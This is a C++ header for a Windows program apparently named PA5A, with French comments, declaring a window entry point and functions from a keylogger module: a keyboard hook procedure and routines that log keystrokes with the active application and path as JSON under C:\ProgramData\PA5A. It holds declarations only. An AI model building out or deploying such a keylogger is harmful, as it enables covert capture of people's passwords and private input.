#ifndef PA5A_HPP
#define PA5A_HPP

#include <Windows.h>
#include <Psapi.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "cJSON/cJSON.hpp"
#include "utils.hpp"

EXTERN_C_START

//Pour afficher les informations de debogage
#define DEBUG

#define DATA_FOLDER L"C:\\ProgramData\\PA5A"
/********************************************************************************************************************************************************/
//main.cpp
INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, INT nCmdShow);
LRESULT CALLBACK WindowProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
/********************************************************************************************************************************************************/
//Keylogger.cpp
LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam);
VOID WriteLogs(PWCHAR logsUnicode, PWCHAR appNameUnicode, PWCHAR pathUnicode);
cJSON* CreateJsonObjectLogs(PCHAR logs, PCHAR app, PCHAR path);
VOID WriteJsonObjectLogs(cJSON* newJsonObject);
/********************************************************************************************************************************************************/

EXTERN_C_END

#endif // PA5A_HPP
